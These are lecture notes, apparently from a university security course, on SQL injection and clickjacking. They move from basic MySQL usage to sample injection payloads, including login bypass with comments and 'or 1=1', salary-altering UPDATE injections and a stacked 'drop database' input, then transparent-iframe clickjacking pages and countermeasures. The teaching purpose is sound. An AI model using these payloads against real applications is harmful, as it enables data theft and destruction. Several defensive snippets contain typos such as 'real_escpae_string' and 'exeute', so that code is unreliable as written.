# Week 7 SQL Injection and Clickjacking

## Directory
- [Home](/README.md#table-of-contents)
- [Week 6 Cross-Site Scripting Attack](/week6/README.md#week-6-cross-site-scripting-attack)
- **&rarr;[Week 7 SQL Injection and Clickjacking](/week7/README.md#week-7-sql-injection-and-clickjacking)**
- [Week 8 Repackaging Attack and Rooting Attack](/week8/README.md#week-8-repackaging-attack-and-rooting-attack)

## 7.2 Par 1: SQL Injection Attack
([top](#directory))

## 7.3 SQL Tutorial

### Web Application Architecture
- Browser
  - request server
- Web Application Server
  - queries database
  - SQL
- Database

### Database Setup

#### Log into mysql

```terminal
$ mysql -uroot -pseedubuntu
...
mysql>
```

#### Create a database
```
mysql> SHOW DATABASE
...
mysql> CREATE DATABASE dbtest
```

#### Create a table

```sql
USE dbtest
CREATE TABLE employee (
    ID int(6) not null auto_increment,
    Name varchar(30) not null,
    EID varchar (7) not null,
    password varchar(60),
    salary int (10),
    ssn varchar(11),
    primary key (ID)
)
describe employee
```

### Query and Update Database
#### Insert a record: INSERT INTO
```sql
insert into employee(Name, EID,Password, Salary, SSN)
VALUES ('ryan', 'eid5000', 'paswd123',80000,'555-55-5555')
```

#### Query a database: SELECT

```sql
select * from employee

select Name, EID, Salary from employee
```

#### Conditions: WHERE clause

```sql
Select * from employee where EID='EID5001'

SELECT * FROM employee where EID='EID5001' or name = 'David'
```

#### A special condition
```sql
select * from employee where 1=1
```
always true

#### update an existing record: UPDATE
```sql
update employee set salary=20000 where Name='bob'
Select * from employee where name = 'bob'
```

#### Comments in SQL Statement

```sql
select * from employee; #  this comment continues to the end of the line
select * from employee; -- this comment continues to the end of the line
select * from /* in-line comment */ employee; 
```

## 7.4 How Web Applications Interact With a Database

## 7.5 SQL Injection: Steal Information
([top](#directory))

```sql
Select name, salary, ssn
from employee
where eid='___' and password='___';
```
how to return data for the eid if you don't know the password

```sql
Select name, salary, ssn
from employee
where eid='EID1000 #' and password='   ';
```

```sql
Select name, salary, ssn
from employee
where eid='EID1000 #'
```
```sql
EID1000 '#
```
comment at the end of eid to ignore password

#### Don't know eid or password

```sql
Select name, salary, ssn
from employee
where eid='xyz' or 1=1--' and password='___';
```

## 7.6 SQL Injection: Modify Database
([top](#directory))


### change you own salary

update your own password, set new salary

```php
$sql="UPDATE employee
set password = '$newpwd' 
where eid = '$eid' and password = '$oldpwd'";
```

```SQL
UPDATE employee
set password = 'newpassword', salary =1000000  -- ' 
where eid = 'EID5000' and password = 'password'
```

### Change your boss salary
EID5001

```sql
update ___
set password = 'ihateyou',salary=0 --'
where eid= 'EID5001' --' and password='    '
```

## 7.7 Turn One SQL Statement into Multiple Statments
([top](#directory))


### Run an Arbitrary SQL Statement

#### user input

```sql
SELECT name, salary, ssn
From employee
 where eid='   ' and password ='   '
```
run arbitrary statement?
```sql
SELECT name, salary, ssn
From employee
 where eid='xyz';drop database employee;  --' and password ='   '
```

### Experiment
php does not allow to send multiple statements to mysql

## 7.8 The Fundamental Cause
([top](#top))

Mixing the data with the code.

### Similarity Among Code-Injection Attacks

- sql injection is code injection
- javascript xss attack is code injection
- `system(cmd)` is code injection
- format string is code injection

- mixing data with the code is dangerous!

## 7.9 Countermeasures
([top](#directory))

### Encoding Special Characters

- apache's configuration
`"magic_quotes_gpc=On"` in php.ini

### PHP's solution: mysqli::real_escape_string()
```php
$eid = $mysqli->real_escpae_string(S_GET['EID']);
$pwd = $mysqli->real_escpae_string(S_GET['Password']);
$sql = "SELECT Name, Salary, SSN 
from employee
WHERE eid='$eid' and password = '$pwd';";
```

### Solving the Fundamental Problem

#### review: How do we defend against the attack on system()?

```c
system(cmd)
cmd = "command"+"user_data";

"command" code: trusted;
"user_data" data: not strusted;

execve(trusted_command,untrusted_argument,untrusted_environment);
```
code and data are separated in `execve(cmd, arg, env)`

### SQL How Prepared Statements Work

- query
- database
  - parse
  - compile
  - optimize
  - execute

#### Prepared Statements

- incomplete sql statement (no data)
  - send code
  - database
    - prepare (parse, compile, optimize)
    - send a handle
  - then send the data to the prepared statement

### Prepared Statement: Example

```php
$sql = "SELECT Name, Salary, SSN 
from employee
WHERE eid=? and password = ?;";
if(stmt=$conn->prepare($sql)){         //code
    $stmt->bind_param("ss",$eid,$pwd); //data
    $stmt->exeute();

    $stmt->bind_result($name, $salary, $ssn);
    while($stmt->fetch()){                       
        printf("%s %s %s\n",$name, $salary,$ssn);
    }
}
```

## 7.11 Summary
([top](#directory))

- SQL Statement
- SQL Injection
- Countermeasures
  - separate data and code
  - prepared statement

## 7.12 Part 2: Clickjacking Attack
([top](#directory))

- fool users into doing something they don't want to do

## 7.13 How Clickjacing Attack Works
([top](#directory))

### iFrame

|HTML|Page|0|
|-|-|-|
|iframe page 1|||
|||iframe page 2|

- iframes
  - transparency
  - overlapping

### transparent iFrame

```html
<html>
<body>
<iframe id="bottom" src="http://site1.com" width="1000" height="500"></iframe>
<iframe id="top" src="http://site2.com" width="1000" height="500"></iframe>

<style type="text/css">
#top {position:absolute; top:50px;left:10px;opacity:0}
#bottom {position:absolute; top:50px;left:10px;opacity:1}
</style>
</body>
</html>
```

### Attack Using Transparent iFrame

- let user see something they like
  - in iFrame
  - see and click like button
- overlay transparent iFrame on top
  - `opacity:0`
  - see and click like button
  - click goes on the top

## 7.14 UI Redressing Attack and Likejacking
([top](#directory))

```html
<html>
<body>
<iframe id="outer" src="http://site1.com" width="1000" height="500"></iframe>
<iframe id="inner" src="http://site2.com" width="5" height="5" seamless="seamless" scrolling="no" frameborder=0></iframe>

<style type="text/css">
#outer {position: absolute; top:0px;  left: 0px;}
#inner {position: absolute; top:10px; left: 830px;opacity: 1}
</style>
</body>
</html>
```

## 7.15 Countermeasures
([top](#directory))


### Approach 1: Framekiller/Framebuster
```html
<html>
<body>
<style>html(display:none;)</style>
<script>
if(self ==top){
    document.documentElement.style.display = 'block';
}else{
    top.location=self.location;
}
</script>
<h2>good</h2>
</body>
</html>
```

### Approach 2: X-Frame-Options

```html
<?php>
header("X-Frame-Options: DENY");
?>

<html>
<body>
<h2>good</h2>
</body>
</html>
```

#### Options
- x-frame-options: DENY
- x-frame-options: SAMEORIGIN
- x-frame-options: ALLOW-FROM %uri%

#### Configure Apached
```php
Header always append x-frame-options SAMEORIGIN
```

## 7.16 Summary
([top](#directory))

- iFrame
- Clickjacking
- Countermeasures